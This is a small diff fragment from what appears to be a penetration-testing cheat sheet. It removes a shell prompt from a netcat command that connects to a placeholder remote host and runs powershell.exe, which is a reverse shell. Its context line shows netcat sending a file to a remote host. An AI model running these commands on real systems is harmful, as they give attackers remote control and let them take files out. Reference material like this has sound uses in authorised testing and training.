@@ -3835,7 +3835,7 @@ $ nc -w 5 <RHOST> <RPORT> < /PATH/TO/FILE/<FILE>
 #### Execute powershell.exe
 
 ```c
-$ C:\temp\nc64.exe <RHOST> <RPORT> -e powershell.exe
+C:\temp\nc64.exe <RHOST> <RPORT> -e powershell.exe
 ```
 
 ### Scanning
